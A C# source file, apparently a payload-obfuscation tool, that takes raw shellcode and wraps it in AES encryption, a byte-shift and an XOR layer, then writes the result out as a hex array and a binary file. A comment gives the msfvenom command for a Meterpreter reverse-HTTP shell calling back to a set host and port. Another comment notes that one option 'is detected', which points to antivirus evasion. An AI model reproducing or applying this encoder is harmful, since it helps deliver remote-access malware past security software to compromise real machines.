using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows;
using System.Security.Cryptography;
using System.IO;

namespace shellcode_encoder
{
    class Program
    {
        static byte[] AESEncryptBytes(byte[] clearBytes, byte[] passBytes, byte[] saltBytes)
        {
            byte[] encryptedBytes = null;

            // create a key from the password and salt, use 32K iterations – see note
            var key = new Rfc2898DeriveBytes(passBytes, saltBytes, 32768);

            // create an AES object
            using (Aes aes = new AesManaged())
            {
                // set the key size to 256
                aes.KeySize = 256;
                aes.Key = key.GetBytes(aes.KeySize / 8);
                aes.IV = key.GetBytes(aes.BlockSize / 8);
                aes.Padding = PaddingMode.PKCS7;

                using (MemoryStream ms = new MemoryStream())
                {
                    using (CryptoStream cs = new CryptoStream(ms, aes.CreateEncryptor(), CryptoStreamMode.Write))
                    {
                        
                        cs.Write(clearBytes, 0, clearBytes.Length);
                        cs.Close();
                    }
                    encryptedBytes = ms.ToArray();
                }
            }
            return encryptedBytes;
        }

        static byte[] AESDecryptBytes(byte[] cryptBytes, byte[] passBytes, byte[] saltBytes)
        {
            byte[] clearBytes = null;

            // create a key from the password and salt, use 32K iterations
            var key = new Rfc2898DeriveBytes(passBytes, saltBytes, 32768);

            using (Aes aes = new AesManaged())
            {
                // set the key size to 256
                aes.KeySize = 256;
                aes.Key = key.GetBytes(aes.KeySize / 8);
                aes.IV = key.GetBytes(aes.BlockSize / 8);
                aes.Padding = PaddingMode.PKCS7;

                using (MemoryStream ms = new MemoryStream())
                {
                    using (CryptoStream cs = new CryptoStream(ms, aes.CreateDecryptor(), CryptoStreamMode.Write))
                    {
                        cs.Write(cryptBytes, 0, cryptBytes.Length);
                        cs.Close();
                    }
                    clearBytes = ms.ToArray();
                }
            }
            return clearBytes;
        }

        static void Main(string[] args)
        {
            //msfvenom -p windows/x64/meterpreter/reverse_http LHOST=192.168.47.130 LPORT=80 -e x64/zutto_dekiru -i 5 -f csharp EXITFUNC=thread
            //PrependMigrate is detected
            byte[] buf = Properties.Resources.test;

            byte[] passBytes = Encoding.UTF8.GetBytes("This is the pass");
            byte[] saltBytes = Encoding.UTF8.GetBytes("This is the salt");
            byte[] aestest = AESEncryptBytes(buf, passBytes, saltBytes);

            //Caesar
            for (int i = 0; i < aestest.Length; i++)
            {
                aestest[i] = (byte)(((uint)aestest[i] + (i & 0xff)) & 0xff);
            }

            //XOR
            Int32 key = 93252512;
            for (int i = 0; i < aestest.Length; i++)
            {
                aestest[i] = (byte)(((uint)aestest[i] ^ (key + i)) & 0xFF);
            }

            byte[] result = aestest;
            ////XOR
            //Int32 key = 93252512;
            //for (int i = 0; i < startcode.Length; i++)
            //{
            //    startcode[i] = (byte)(((uint)startcode[i] ^ (key + i)) & 0xFF);
            //}


            //for (int i = 0; i < startcode.Length; i++)
            //{
            //    startcode[i] = (byte)(((uint)startcode[i] - (i & 0xFF)) & 0xFF);
            //}


            //byte[] passBytes = Encoding.UTF8.GetBytes("This is the pass");
            //byte[] saltBytes = Encoding.UTF8.GetBytes("This is the salt");
            //byte[] result = AESDecryptBytes(startcode, passBytes, saltBytes);


            StringBuilder hex = new StringBuilder(result.Length * 2);
            var each_line = 15;
            var total_length = 0;

            foreach (byte b in result)
            {
                hex.AppendFormat("0x{0:x2},", b);
                each_line = each_line - 1;
                total_length = total_length + 1;
                if (each_line == 0)
                {
                    hex.Append("\n");
                    each_line = 15;
                }

            }

            Console.WriteLine("The payload (" + total_length  + ") is:\n" + hex.ToString());
            File.WriteAllBytes(@"C:\Windows\temp\temp.bin", result);
        }
    }
}
